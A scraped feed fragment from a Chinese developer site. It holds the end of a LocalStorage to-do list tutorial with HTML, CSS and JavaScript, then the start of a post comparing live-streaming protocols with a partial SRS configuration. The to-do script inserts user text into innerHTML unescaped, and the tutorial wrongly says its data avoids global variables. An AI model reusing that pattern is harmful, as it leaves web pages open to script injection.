  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span> + <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"✅"</span>; <span class="hljs-comment">/* 选中时切换图标 */</span>
}

<span class="hljs-comment">/* 表单样式 */</span>
<span class="hljs-selector-class">.add-items</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* 输入框与按钮间距 */</span>
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"text"</span>]</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">outline</span>: <span class="hljs-number">3px</span> solid transparent;
  <span class="hljs-attribute">transition</span>: outline <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"text"</span>]</span><span class="hljs-selector-pseudo">:focus</span> {
  <span class="hljs-attribute">outline</span>: <span class="hljs-number">3px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0.8</span>); <span class="hljs-comment">/* 聚焦高亮 */</span>
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"submit"</span>]</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0.8</span>);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"submit"</span>]</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-10">3. 核心文件：index.html</h3>
<p>html</p>
<p>预览</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>LocalStorage 待办清单<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./common.css"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"wrapper"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>LOCAL TAPAS<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"plates"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Loading Tapas...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"add-items"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
        <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> 
        <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入待办事项"</span> 
        <span class="hljs-attr">required</span>
        <span class="hljs-attr">name</span>=<span class="hljs-string">"item"</span>
      &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"+ 添加事项"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// 1. 获取 DOM 元素</span>
    <span class="hljs-keyword">const</span> addItemsForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.add-items'</span>);
    <span class="hljs-keyword">const</span> itemsList = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.plates'</span>);
    <span class="hljs-comment">// 2. 从 LocalStorage 取数据（无则初始化空数组）</span>
    <span class="hljs-keyword">const</span> items = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'todos'</span>)) || [];

    <span class="hljs-comment">/**
     * 渲染待办列表
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} <span class="hljs-variable">plates</span> - 待办数组
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Element</span>} <span class="hljs-variable">platesList</span> - 列表 DOM 元素
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">populateList</span>(<span class="hljs-params">plates = [], platesList</span>) {
      <span class="hljs-comment">// 数组 map 生成 DOM 字符串，join 拼接（避免逗号分隔）</span>
      platesList.<span class="hljs-property">innerHTML</span> = plates.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">plate, index</span>) =&gt;</span> <span class="hljs-string">`
        &lt;li&gt;
          &lt;input 
            type="checkbox" 
            data-index="<span class="hljs-subst">${index}</span>" 
            id="item<span class="hljs-subst">${index}</span>"
            <span class="hljs-subst">${plate.done ? <span class="hljs-string">'checked'</span> : <span class="hljs-string">''</span>}</span>
          /&gt;
          &lt;label for="item<span class="hljs-subst">${index}</span>"&gt;<span class="hljs-subst">${plate.text}</span>&lt;/label&gt;
        &lt;/li&gt;
      `</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
    }

    <span class="hljs-comment">/**
     * 添加待办事项
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Event</span>} <span class="hljs-variable">event</span> - 表单提交事件
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addItem</span>(<span class="hljs-params">event</span>) {
      event.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// 阻止表单默认提交行为</span>
      <span class="hljs-comment">// 获取输入框值（去空格）</span>
      <span class="hljs-keyword">const</span> text = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'[name=item]'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
      <span class="hljs-keyword">if</span> (!text) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 空值不添加</span>

      <span class="hljs-comment">// 新增待办对象</span>
      <span class="hljs-keyword">const</span> newItem = {
        text,
        <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 默认未完成</span>
      };

      items.<span class="hljs-title function_">push</span>(newItem);
      <span class="hljs-comment">// 存入 LocalStorage（序列化数组）</span>
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'todos'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(items));
      <span class="hljs-comment">// 重新渲染列表</span>
      <span class="hljs-title function_">populateList</span>(items, itemsList);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>(); <span class="hljs-comment">// 重置表单</span>
    }

    <span class="hljs-comment">/**
     * 切换待办完成状态
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Event</span>} <span class="hljs-variable">event</span> - 点击事件
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">toggleDone</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>;
      <span class="hljs-comment">// 只处理复选框的点击</span>
      <span class="hljs-keyword">if</span> (target.<span class="hljs-property">tagName</span> !== <span class="hljs-string">'INPUT'</span>) <span class="hljs-keyword">return</span>;

      <span class="hljs-comment">// 获取数据索引（从 data-index 属性）</span>
      <span class="hljs-keyword">const</span> index = target.<span class="hljs-property">dataset</span>.<span class="hljs-property">index</span>;
      <span class="hljs-comment">// 切换完成状态</span>
      items[index].<span class="hljs-property">done</span> = !items[index].<span class="hljs-property">done</span>;
      <span class="hljs-comment">// 更新 LocalStorage</span>
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'todos'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(items));
      <span class="hljs-comment">// 重新渲染</span>
      <span class="hljs-title function_">populateList</span>(items, itemsList);
    }

    <span class="hljs-comment">// 3. 绑定事件监听</span>
    addItemsForm.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, addItem);
    itemsList.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, toggleDone);

    <span class="hljs-comment">// 4. 页面加载时渲染列表</span>
    <span class="hljs-title function_">populateList</span>(items, itemsList);
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-11">三、关键技术拆解：为什么这么写？</h2>
<h3 data-id="heading-12">1. LocalStorage 持久化逻辑</h3>
<ul>
<li><strong>初始化</strong>：页面加载时从 <code>localStorage</code> 读取 <code>todos</code> 数据，若不存在则初始化为空数组</li>
<li><strong>新增待办</strong>：添加后立即用 <code>JSON.stringify()</code> 序列化数组，存入 <code>localStorage</code></li>
<li><strong>状态切换</strong>：修改待办完成状态后，同步更新 <code>localStorage</code>，确保刷新后状态不丢失</li>
</ul>
<h3 data-id="heading-13">2. CSS 进阶技巧</h3>
<ul>
<li><strong>盒模型继承</strong>：通过 <code>box-sizing: inherit</code> 让所有元素（包括伪元素）继承 <code>border-box</code>，避免计算宽度时的麻烦</li>
<li><strong>Flex 布局妙用</strong>：页面整体居中、待办项复选框与文本对齐、表单输入框与按钮同行分布，都用 Flex 实现，简洁高效</li>
<li><strong>自定义复选框</strong>：隐藏原生复选框，用 <code>:before</code> 伪元素实现自定义图标，提升视觉体验</li>
<li><strong>聚焦状态优化</strong>：输入框聚焦时添加蓝色轮廓，提升交互反馈</li>
</ul>
<h3 data-id="heading-14">3. 工程化编码思想</h3>
<h4 data-id="heading-15">（1）函数式封装：拒绝流程式代码</h4>
<ul>
<li>把「渲染列表」「添加待办」「切换状态」拆分为 3 个独立函数，每个函数只做一件事</li>
<li>函数参数化：<code>populateList</code> 接收待办数组和列表 DOM 元素，增强复用性</li>
<li>避免全局变量污染：核心数据 <code>items</code> 通过函数参数传递，而非依赖全局变量</li>
</ul>
<h4 data-id="heading-16">（2）细节优化：提升用户体验</h4>
<ul>
<li>输入框去空格：用 <code>trim()</code> 避免添加空待办</li>
<li>空值判断：输入为空时不添加待办</li>
<li>表单重置：添加后清空输入框，方便连续输入</li>
<li>事件委托：给列表父元素绑定点击事件，而非给每个复选框绑定，提升性能（尤其待办较多时）</li>
</ul>
<h2 data-id="heading-17">四、扩展与优化方向</h2>
<ol>
<li><strong>添加删除功能</strong>：给每个待办项增加删除按钮，点击时删除对应项并更新 <code>localStorage</code></li>
<li><strong>批量操作</strong>：实现「全选 / 全不选」「清空已完成」功能</li>
<li><strong>数据持久化优化</strong>：封装 <code>localStorage</code> 操作工具函数，避免重复写 <code>JSON.stringify</code> 和 <code>JSON.parse</code></li>
<li><strong>样式升级</strong>：添加动画效果（如待办项添加 / 删除时的过渡动画）</li>
<li><strong>响应式优化</strong>：适配移动端，优化小屏幕下的布局</li>
</ol>
<h2 data-id="heading-18">五、总结</h2>
<p>本文通过一个简单的待办清单案例，串联了 LocalStorage 本地存储、CSS 进阶特性和前端工程化编码思想。核心要点：</p>
<ul>
<li>LocalStorage 是前端持久化存储的基础，关键是掌握「序列化 / 反序列化」技巧</li>
<li>CSS 不仅是样式，合理运用继承、Flex 布局和伪元素，能大幅提升开发效率和视觉体验</li>
<li>工程化编码的核心是「拆分与封装」，让代码更易维护、可复用</li>
</ul>
<p>这个案例虽然简单，但包含了前端开发的核心思想，适合新手入门练习，也能帮助有经验的开发者巩固基础。动手试试扩展功能，让它变得更强大吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谈谈最进学习（低延迟）直播项目的坎坷与收获]]></title>    <link>https://juejin.cn/post/7575152891955314688</link>    <guid>https://juejin.cn/post/7575152891955314688</guid>    <pubDate>2025-11-23T02:51:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955314688" data-draft-id="7575152891955298304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谈谈最进学习（低延迟）直播项目的坎坷与收获"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T02:51:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小熊哥722"/> <meta itemprop="url" content="https://juejin.cn/user/758013551998826"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谈谈最进学习（低延迟）直播项目的坎坷与收获
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/758013551998826/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小熊哥722
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:51:03.000Z" title="Sun Nov 23 2025 02:51:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近一直在学习低延迟直播系统的开发，从协议选型到具体实现，踩过不少坑，也积累了很多经验。分享一下这段旅程中的思考和收获～</p>
<h2 data-id="heading-0">一、直播核心协议选型：从认知到决策</h2>
<p>开发的第一步，是理清主流直播协议的特性，找到适配场景的技术方向。以下是我对核心协议的整理与分析：</p>
<h3 data-id="heading-1">1. HTTP-FLV：兼容性之王</h3>
<p><strong>核心特点</strong>：基于 HTTP 分块编码传输 FLV 容器格式，轻量化、易部署。</p>
<ul>
<li>
<p><strong>封装与传输</strong>：FLV 仅支持 H.264/H.265（视频）、AAC/MP3（音频），封装简单（头部 + 音视频 Tag），解码延迟低；借助 HTTP 分块编码实现 “边传边播”，默认 80/443 端口可穿透防火墙。</p>
</li>
<li>
<p><strong>传输流程</strong>：</p>
<ol>
<li>播放端发送<code>GET /live/stream.flv</code>请求，携带<code>Accept: */*</code>；</li>
<li>服务端响应<code>Transfer-Encoding: chunked</code>，按 1-8KB 拆分 FLV 流并实时推送。</li>
</ol>
</li>
<li>
<p><strong>延迟构成</strong>：</p>
<ul>
<li>编码延迟（50ms-300ms）：依赖推流端低延迟配置（无 B 帧、短 GOP）；</li>
<li>服务端延迟（300ms-2s）：GOP 缓存 / 转码是主因（优化后可压至 300ms 内）；</li>
<li>传输 + 播放端延迟（400ms-1.9s）：HTTP 封装开销 + 播放器缓冲（优化后可至 0.3-1s）。</li>
</ul>
</li>
<li>
<p><strong>优缺点</strong>：✅ 兼容性极强（浏览器 / APP / 机顶盒）、配置简单、支持 HTTPS；❌ 协议开销略高、依赖 GOP 缓存、Web 端需 FLV.js 解析。</p>
</li>
</ul>
<h3 data-id="heading-2">2. RTMP：低延迟直播老将</h3>
<p><strong>核心特点</strong>：基于 TCP 的实时消息传输协议，专为音视频设计。</p>
<ul>
<li><strong>传输机制</strong>：分层结构（应用层 / 消息层 / 协议层），Chunk 分块传输大帧，滑动窗口控流。</li>
<li><strong>延迟优势</strong>：优化后全链路延迟 0.8-2s，比 HTTP-FLV 低 20%-30%，服务端无转码时延迟可忽略。</li>
<li><strong>优缺点</strong>：✅ 延迟低、配置直接、兼容性广；❌ 弱网 TCP 重传易卡顿、无默认加密、Web 端需 Flash 替代方案。</li>
</ul>
<h3 data-id="heading-3">3. HLS/LL-HLS：跨平台兼容首选</h3>
<p><strong>核心特点</strong>：切片传输 + 自适应码率，原生支持全平台。</p>
<ul>
<li><strong>原生痛点</strong>：切片机制导致延迟 10-30s（切片生成 + 缓存 + 播放缓冲）；</li>
<li><strong>LL-HLS 优化</strong>：缩短切片至 0.5-2s、分片传输 Chunk、实时更新 m3u8，延迟降至 3-5s。</li>
<li><strong>优缺点</strong>：✅ 极致兼容、自适应码率、易部署；❌ 原生延迟高、切片开销大、实时性差。</li>
</ul>
<h3 data-id="heading-4">4. WebRTC：实时互动利器</h3>
<p><strong>核心特点</strong>：浏览器原生实时通信，毫秒级延迟（50-300ms）。</p>
<ul>
<li><strong>技术栈</strong>：集成采集 / 编码 / 传输 / 渲染，UDP 传输 + P2P 直连，内置回声消除等互动功能。</li>
<li><strong>延迟构成</strong>：采集编码（30-80ms）+ 传输（20-150ms）+ 解码渲染（10-30ms）。</li>
<li><strong>优缺点</strong>：✅ 延迟最低、互动性强、无插件依赖；❌ 部署复杂（需 STUN/TURN/SFU）、带宽占用高。</li>
</ul>
<h3 data-id="heading-5">5. SRT：专业级低延迟传输</h3>
<p><strong>核心特点</strong>：UDP 可靠传输 + 加密，延迟 10-150ms，抗丢包（10% 丢包仍稳定）。</p>
<ul>
<li><strong>技术优势</strong>：ARQ 重传 + FEC 纠错，原生 AES 加密，适配 4K/8K 高码率传输。</li>
<li><strong>优缺点</strong>：✅ 延迟极低、可靠性强、加密安全；❌ Web 端兼容性差、CDN 支持有限、配置精细。</li>
</ul>
<h3 data-id="heading-6">协议特性对比表</h3>






















































<table><thead><tr><th>特性</th><th>SRT</th><th>WebRTC</th><th>HTTP-FLV（优化后）</th><th>RTMP（优化后）</th></tr></thead><tbody><tr><td>原生延迟</td><td>10-150ms</td><td>50-300ms</td><td>1-2.5s</td><td>0.8-2s</td></tr><tr><td>传输协议</td><td>UDP（可靠传输）</td><td>UDP（为主）</td><td>TCP（HTTP/HTTP3）</td><td>TCP</td></tr><tr><td>丢包容忍性</td><td>强（10% 丢包）</td><td>中（5% 丢包）</td><td>强（TCP 重传）</td><td>中（TCP 重传阻塞）</td></tr><tr><td>加密支持</td><td>原生 AES</td><td>需 DTLS</td><td>依赖 HTTPS</td><td>需 RTMPS</td></tr><tr><td>高并发支持</td><td>中（需媒体服务器）</td><td>低（P2P 带宽受限）</td><td>高（CDN 分发）</td><td>中（CDN 支持）</td></tr><tr><td>部署复杂度</td><td>中</td><td>高</td><td>低</td><td>中</td></tr></tbody></table>
<h2 data-id="heading-7">二、开发实践：从选型到落地的坎坷</h2>
<h3 data-id="heading-8">1. 初期选型：WebRTC 的尝试与碰壁</h3>
<p>最开始选择 WebRTC 作为核心协议（一是初期对 SRT 认知不足，二是看中其浏览器原生兼容性）：</p>
<ul>
<li>手动封装信令服务器 + WebRTC 推拉流组件，实现基础功能后发现<strong>并发极低</strong>；</li>
<li>转向 MediaSoup（SFU 框架）优化并发，但全英文文档 + 拓展复杂度高，最终放弃。</li>
</ul>
<p>这段经历虽未落地，但吃透了 WebRTC 的信令交互、NAT 穿透、媒体流处理逻辑。</p>
<h3 data-id="heading-9">2. 最终选型：SRS 的救赎</h3>
<p>SRS（Simple Real-Time Server）是开源实时视频服务器，支持多协议转换，成为我的最终选择：</p>
<ul>
<li>支持 RTMP/WebRTC/HTTP-FLV/SRT 等协议，开箱即用；</li>
<li>解决了 WebRTC 并发问题，且支持协议转换（如 RTMP 转 WebRTC）。</li>
</ul>
<h4 data-id="heading-10">SRS 配置（6.0 版本）</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># main config for srs.</span>
listen              1935<span class="hljs-comment">;          # RTMP端口</span>
max_connections     1000<span class="hljs-comment">;          # 最大连接数</span>
daemon              on<span class="hljs-comment">;            # 守护进程模式</span>

<span class="hljs-comment"># HTTP API：用于控制和查询SRS状态</span>
http_api {
    enabled         on<span class="hljs-comment">;</span>
    listen          1985<span class="hljs-comment">;</span>
}

<span class="hljs-comment"># HTTP服务器：提供HLS/HTTP-FLV访问</span>
http_server {
    enabled         on<span class="hljs-comment">;</span>
    listen          8080<span class="hljs-comment">;</span>
    dir             ./objs/nginx/html<span class="hljs-comment">; # 静态文件目录</span>
}

<span class="hljs-comment"># WebRTC配置：UDP端口+公网候选地址</span>
rtc_server {
    enabled on<span class="hljs-comment">;</span>
    listen  8000<span class="hljs-comment">; # WebRTC的UDP端口</span>
    candidate 0.0.0.0<span class="hljs-comment">; # 公网服务器需替换为实际IP</span>
}

vhost __defaultVhost__ {
    <span class="hljs-comment"># HLS配置：低延迟切片</span>
    hls {
        enabled         on<span class="hljs-comment">;</span>
        hls_path        ./objs/nginx/html/hls<span class="hljs-comment">;</span>
        hls_m3u8_file   <span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>.m3u8<span class="hljs-comment">;</span>
        hls_ts_file     <span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>-<span class="hljs-section">[seq]</span>.ts<span class="hljs-comment">;</span>
        hls_fragment    1<span class="hljs-comment">; # 1秒切片，降低延迟</span>
    }

    <span class="hljs-comment"># HTTP-FLV挂载</span>
    http_remux {
        enabled     on<span class="hljs-comment">;</span>
        mount       <span class="hljs-section">[vhost]</span>/<span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>.flv<span class="hljs-comment">;</span>
    }

    <span class="hljs-comment"># WebRTC与RTMP互转</span>
    rtc {
